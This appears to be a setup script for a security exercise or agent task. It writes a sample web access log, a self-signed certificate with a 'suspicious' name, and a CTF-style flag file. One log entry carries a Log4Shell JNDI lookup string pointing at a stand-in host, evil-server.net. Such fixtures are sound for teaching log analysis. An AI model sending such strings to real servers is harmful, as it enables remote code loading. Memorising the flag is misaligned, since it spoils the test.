#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip openssl
    pip3 install pytest

    mkdir -p /home/user

    # 1. Create access.log
    cat << 'EOF' > /home/user/access.log
10.0.0.2 - - [10/Oct/2023:13:55:31 -0000] "GET /index.html HTTP/1.1" 200 1024
192.168.1.10 - - [10/Oct/2023:13:55:34 -0000] "GET /login HTTP/1.1" 401 -
172.16.50.100 - - [10/Oct/2023:13:55:36 -0000] "GET /?q=${jndi:ldap://evil-server.net/Exploit} HTTP/1.1" 404 512
10.0.0.5 - - [10/Oct/2023:13:55:40 -0000] "POST /api/data HTTP/1.1" 200 50
EOF

    # 2. Create service.pem
    openssl req -x509 -newkey rsa:2048 -keyout /tmp/temp.key -out /home/user/service.pem -days 365 -nodes -subj "/C=US/ST=State/L=City/O=Org/CN=suspicious.local"

    # 3. Create secret.key
    echo "FLAG{b4sh_1nj3ct10n_m4st3r}" > /home/user/secret.key

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
